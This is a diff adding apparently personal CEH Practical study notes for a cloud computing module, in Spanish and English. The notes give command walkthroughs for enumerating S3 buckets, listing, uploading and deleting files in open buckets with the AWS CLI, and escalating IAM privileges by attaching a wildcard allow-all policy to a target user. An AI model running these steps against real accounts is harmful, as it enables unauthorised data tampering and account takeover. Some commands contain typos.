@@ -1,0 +1,120 @@
+CEH Practical Notes
+------------------------------------------------
+Modulo 19 - Cloud Computing
+------------------------------------------------
+
+# Los servicios en la nube se clasifican en tres categorías: 
+	- Infraestructura como servicio (IaaS) 
+	- Plataforma como servicio (PaaS)
+	- Software como servicio (SaaS), que ofrecen diferentes técnicas para desarrollar la nube.
+
+# All buckets have a predictable and publicly accessible URL like this:
+
+	- http://s3.amazonaws.com/[bucket_name]/
+
+	- http://[bucket_name].s3.amazonaws.com/
+
+1 - Perform S3 bucket enumeration using various S3 bucket enumeration tools
+
+	1.1 - Enumerate S3 buckets using lazys3
+
+		># ruby lazys3 "Compañía"
+
+	1.2 - Enumerate S3 buckets using S3Scanner
+
+		># pyhton3 s3scanner.py sites.txt
+
+		# Vierta todos los depósitos abiertos y registre tanto los depósitos abiertos como los cerrados en found.txt:
+
+			># python3 ./s3scanner.py --include-closed --out-file found.txt --dump names.txt
+
+		# Simplemente registre los depósitos abiertos en el archivo de salida predeterminado (buckets.txt):
+
+			># python3 ./s3scanner.py nombres.txt
+
+		# Guarde las listas de archivos de todos los depósitos abiertos en un archivo:
+
+			># python ./s3scanner.py - lista de nombres.txt
+
+2 - Exploit S3 buckets
+
+	# Técnicas que se pueden adoptar para identificar AWS S3 Buckets:
+
+		- Inspección de HTML: analice el código fuente de las páginas web HTML en segundo plano para encontrar las URL de los depósitos de S3 de destino.
+		- URL de fuerza bruta: use Burp Suite para realizar un ataque de fuerza bruta en la URL del depósito de destino para identificar su URL correcta.
+		- Encontrar subdominios: utilice herramientas como Findsubdomains y Robtex para identificar subdominios relacionados con el depósito de destino.
+		- Búsqueda de IP inversa: utilice motores de búsqueda como Bing para realizar una búsqueda de IP inversa para identificar los dominios de los depósitos S3 de destino.
+		- Piratería avanzada de Google: utilice operadores de búsqueda avanzada de Google como "inurl" para buscar URL relacionadas con los depósitos S3 de destino.
+
+	2.1 - Exploit open S3 buckets using AWS CLI
+
+		# Instalar Aws Cli
+
+			># pip3 install awscli
+
+		# Obtener Access Key
+
+			># aws configure (Access Key, Secret Access Key)
+
+		# Acceder a recurso
+
+			># aws s3 ls s3://"buckets3"
+
+		# Podemos acceder a través del navegador: https://certificatehacker1.s3.amazonaws.com
+
+		# Podemos mover archivos al bucket a través de AWS CLI
+
+			># aws s3 mv Hack.txt s3://certifiedhacker1
+
+		# Podemos borrar archivos del bucket
+
+			># aws s3 rm s3://certifiedhacker1/Hack.txt
+
+3 - Perform privilege escalation to gain higher privileges
+
+	3.1 - Escalate IAM user privileges by exploiting misconfigured user policy
+
+		# Configurar AWS:
+
+			># aws configure
+
+				# Configurar Keys
+				# Default region name: eu-west-2
+				# Default output format: json
+
+		# Crear AdministratorAccess Policy:
+
+		># nano user-policy.json
+
+
+			"Version": "2012-10-17",
+
+			"Statement": [
+				{
+
+    				"Effect": "Allow",
+
+				    "Action": "*",
+
+    				"Resource": "*"
+
+				}
+			]
+
+		># aws iam create-policy --policy-name user-policy --policy-document file://user-policy.json
+		># aws iam attach-user-policy --user-name [Target Username] --policy-arn arn:aws:iam::[Account ID]:policy/user-policy
+		># aws iam list-attached-user-policies --user-name [Target Username]
+		># aws iam list-users
+
+
+		# Otros comandos para enumerar s3-buckets:
+
+			- List of S3 buckets: aws s3api list-buckets --query "Buckets[].Name"
+
+			- User Policies: aws iam list-user-policies
+			
+			- Role Policies: aws iam list-role-policies
+			
+			- Group policies: aws iam list-group-policies
+			
+			- Create user: aws iam create-user			
